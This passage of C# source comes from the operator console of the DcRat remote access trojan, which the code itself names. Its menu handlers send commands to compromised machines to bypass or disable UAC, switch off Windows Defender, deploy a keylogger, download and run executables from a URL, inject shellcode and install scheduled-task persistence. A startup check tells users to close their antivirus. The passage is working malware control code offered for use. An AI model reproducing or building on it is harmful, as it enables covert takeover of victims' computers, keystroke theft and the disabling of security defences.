                    {
                        var packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "disableUAC";

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Extra.dll");
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        foreach (var client in GetSelectedClients())
                            if (client.LV.SubItems[lv_admin.Index].Text == "Admin")
                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
            }
        }


        private void CompMgmtLauncherToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "uacbypass2";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Options.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        private void DocumentToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Process.Start("https://github.com/qwqdanchun/DcRat");
        }

        private void SettingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var formSetting = new FormSetting())
            {
                formSetting.ShowDialog();
            }
        }

        private void autoKeyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "sendMemory";
                packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(@"Plugins\Keylogger.exe")));
                packet.ForcePathObject("Inject").AsString = "";

                var lv = new ListViewItem();
                lv.Text = "Auto Keylogger:";
                lv.SubItems.Add("0");
                lv.ToolTipText = Guid.NewGuid().ToString();

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SendMemory.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                if (listView4.Items.Count > 0)
                    foreach (ListViewItem item in listView4.Items)
                        if (item.Text == lv.Text)
                            return;

                Program.form1.listView4.Items.Add(lv);
                Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void SchtaskUninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "schtaskuninstall";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Options.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        private void fakeBinderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var openFileDialog = new OpenFileDialog();
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "fakeBinder";
                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
                    packet.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SendFile.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    var lv = new ListViewItem();
                    lv.Text = "FakeBinder: " + Path.GetFileName(openFileDialog.FileName);
                    lv.SubItems.Add("0");
                    lv.ToolTipText = Guid.NewGuid().ToString();

                    if (listView4.Items.Count > 0)
                        foreach (ListViewItem item in listView4.Items)
                            if (item.Text == lv.Text)
                                return;

                    Program.form1.listView4.Items.Add(lv);
                    Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void netstatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Netstat.dll");

                foreach (var client in GetSelectedClients())
                {
                    var netstat = (FormNetstat)Application.OpenForms["Netstat:" + client.ID];
                    if (netstat == null)
                    {
                        netstat = new FormNetstat
                        {
                            Name = "Netstat:" + client.ID,
                            Text = "Netstat:" + client.ID,
                            F = this,
                            ParentClient = client
                        };
                        netstat.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void fromUrlToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var Msgbox = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url");
            if (string.IsNullOrEmpty(Msgbox)) return;

            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
                    packet.ForcePathObject("url").AsString = Msgbox;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Extra.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        private void sendFileFromUrlToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var Msgbox = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url");
                if (string.IsNullOrEmpty(Msgbox)) return;

                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
                packet.ForcePathObject("url").AsString = Msgbox;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Extra.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                var lv = new ListViewItem();
                lv.Text = "SendFileFromUrl: " + Path.GetFileName(Msgbox);
                lv.SubItems.Add("0");
                lv.ToolTipText = Guid.NewGuid().ToString();

                if (listView4.Items.Count > 0)
                    foreach (ListViewItem item in listView4.Items)
                        if (item.Text == lv.Text)
                            return;

                Program.form1.listView4.Items.Add(lv);
                Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void installSchtaskToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "autoschtaskinstall";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Options.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                var lv = new ListViewItem();
                lv.Text = "InstallSchtask:";
                lv.SubItems.Add("0");
                lv.ToolTipText = Guid.NewGuid().ToString();

                if (listView4.Items.Count > 0)
                    foreach (ListViewItem item in listView4.Items)
                        if (item.Text == lv.Text)
                            return;

                Program.form1.listView4.Items.Add(lv);
                Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void disableUACToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "disableUAC";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Extra.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                var lv = new ListViewItem();
                lv.Text = "DisableUAC:";
                lv.SubItems.Add("0");
                lv.ToolTipText = Guid.NewGuid().ToString();

                if (listView4.Items.Count > 0)
                    foreach (ListViewItem item in listView4.Items)
                        if (item.Text == lv.Text)
                            return;

                Program.form1.listView4.Items.Add(lv);
                Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, true));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void disableWDToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "disableDefedner";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Extra.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                var lv = new ListViewItem();
                lv.Text = "DisableDefedner:";
                lv.SubItems.Add("0");
                lv.ToolTipText = Guid.NewGuid().ToString();

                if (listView4.Items.Count > 0)
                    foreach (ListViewItem item in listView4.Items)
                        if (item.Text == lv.Text)
                            return;

                Program.form1.listView4.Items.Add(lv);
                Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, true));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void ConnectTimeout_Tick(object sender, EventArgs e)
        {
            var clients = GetAllClients();
            if (clients.Length > 0)
                foreach (var client in clients)
                    if (Methods.DiffSeconds(client.LastPing, DateTime.Now) > 20)
                        client.Disconnected();
        }

        private void remoteRegeditToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Regedit.dll");

                foreach (var client in GetSelectedClients())
                {
                    var registryEditor = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + client.ID];
                    if (registryEditor == null)
                    {
                        registryEditor = new FormRegistryEditor
                        {
                            Name = "remoteRegedit:" + client.ID,
                            Text = "remoteRegedit:" + client.ID,
                            //Client = client,
                            ParentClient = client,
                            F = this
                        };
                        registryEditor.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void normalInstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "normalinstall";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Options.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        private void normalUninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "normaluninstall";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Options.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        private void justForFunToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Fun.dll");

                foreach (var client in GetSelectedClients())
                {
                    var fun = (FormFun)Application.OpenForms["fun:" + client.ID];
                    if (fun == null)
                    {
                        fun = new FormFun
                        {
                            Name = "fun:" + client.ID,
                            Text = "fun:" + client.ID,
                            F = this,
                            ParentClient = client
                        };
                        fun.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void runShellcodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                using (var openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Multiselect = false;
                    openFileDialog.Filter = "(*.bin)|*.bin";
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        var packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "Shellcode";
                        packet.ForcePathObject("Bin").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Miscellaneous.dll");
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        foreach (var client in GetSelectedClients())
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void noSystemToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "nosystem";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Options.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                    if (client.LV.SubItems[lv_user.Index].Text.ToLower() == "system")
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }


        #region Form Helper

        private void CheckFiles()
        {
            try
            {
                if (!File.Exists(Path.Combine(Application.StartupPath,
                        Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + ".config")))
                {
                    MessageBox.Show("Missing " + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) +
                                    ".config");
                    Environment.Exit(0);
                }

                if (!File.Exists(Path.Combine(Application.StartupPath, "Stub\\Client.exe")))
                    MessageBox.Show("Missing client file,please close the Anti-virus and unzip again.");

                if (!Directory.Exists(Path.Combine(Application.StartupPath, "Stub")))
                    Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Stub"));
                if (!File.Exists(Path.Combine(Application.StartupPath, "Plugins\\ip2region.db")))
                    File.WriteAllBytes(Path.Combine(Application.StartupPath, "Plugins\\ip2region.db"),
                        Resources.ip2region);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "DcRat", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private Clients[] GetSelectedClients()
        {
            var clientsList = new List<Clients>();
            Invoke((MethodInvoker)(() =>
            {
                lock (Settings.LockListviewClients)
                {
                    if (listView1.SelectedItems.Count == 0) return;
                    foreach (ListViewItem itm in listView1.SelectedItems) clientsList.Add((Clients)itm.Tag);
                }
            }));
            return clientsList.ToArray();
        }

        private Clients[] GetAllClients()
        {
            var clientsList = new List<Clients>();
            Invoke((MethodInvoker)(() =>
            {
                lock (Settings.LockListviewClients)
                {
                    if (listView1.Items.Count == 0) return;
                    foreach (ListViewItem itm in listView1.Items) clientsList.Add((Clients)itm.Tag);
                }
            }));
            return clientsList.ToArray();
        }

        private async void Connect()
        {
            try
            {
                await Task.Delay(1000);
                var ports = Properties.Settings.Default.Ports.Split(',');
                foreach (var port in ports)
                    if (!string.IsNullOrWhiteSpace(port))
                    {
                        var listener = new Listener();
                        var thread = new Thread(listener.Connect);
                        thread.IsBackground = true;
                        thread.Start(Convert.ToInt32(port.Trim()));
                    }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                Environment.Exit(0);
            }
        }

        #endregion

        #region Form Events

        private async void Form1_Load(object sender, EventArgs e)
        {
            ListviewDoubleBuffer.Enable(listView1);
            ListviewDoubleBuffer.Enable(listView2);
            ListviewDoubleBuffer.Enable(listView3);

            try
            {
                foreach (var client in Properties.Settings.Default.txtBlocked.Split(','))
                    if (!string.IsNullOrWhiteSpace(client))
                        Settings.Blocked.Add(client);
            }
            catch
            {
            }


            CheckFiles();
            lvwColumnSorter = new ListViewColumnSorter();
            listView1.ListViewItemSorter = lvwColumnSorter;
            Text = $"{Settings.Version}";
#if DEBUG
            Settings.ServerCertificate = new X509Certificate2(Convert.FromBase64String(
                "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"));
            var listener = new Listener();
            var thread = new Thread(listener.Connect);
            thread.IsBackground = true;
            thread.Start(8848);
#else
            using (FormPorts portsFrm = new FormPorts())
            {
                portsFrm.ShowDialog();
            }
#endif


            await Methods.FadeIn(this, 5);
            trans = true;

            if (Properties.Settings.Default.Notification)
                toolStripStatusLabel2.ForeColor = Color.Green;
            else
                toolStripStatusLabel2.ForeColor = Color.Black;

            //Disable contact information to promote this rat on some forums
            if (Application.StartupPath.Contains("52pojie"))
